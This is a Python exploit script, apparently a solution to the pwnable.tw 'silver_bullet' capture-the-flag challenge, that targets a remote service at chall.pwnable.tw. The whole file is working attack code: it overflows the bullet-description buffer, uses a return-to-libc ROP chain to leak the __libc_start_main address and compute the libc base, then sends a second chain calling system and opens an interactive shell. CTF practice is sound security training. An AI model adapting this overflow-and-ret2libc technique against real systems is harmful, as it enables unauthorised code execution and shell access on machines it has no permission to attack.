#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *

exe = context.binary = ELF('./silver_bullet')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10103)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x080487fa

continue
'''.format(**locals())

def choice(option):
    sla("Your choice :", str(option))

def create(buf):
    choice(1)
    sa("Give me your description of bullet :", buf)
    log.info(rl())

def update(buf):
    choice(2)
    sa("Give me your another description of bullet :", buf)
    log.info(rl())


def beat():
    choice(3)
    log.info(rl())
    log.info(rl())
    log.info(rl())
    log.info(rl())

# -- Exploit goes here --
libc = ELF("./libc.so.6")
io = start()
create('a'*47)
update("a")
rop = ret2libcleak("__libc_start_main")
update(b"\xff\xff\xff\xff\xff\xff\xff" + rop)
beat()
reu("Oh ! You win !!\n")
libc.address = u64_bytes(4) - libc.sym['__libc_start_main']
log.info(f"libc base : {hex(libc.address)}")
create('a'*47)
update("a")
rop = ret2libcsystem()
update(b"\xff\xff\xff\xff\xff\xff\xff" + rop)
beat()
io.interactive()

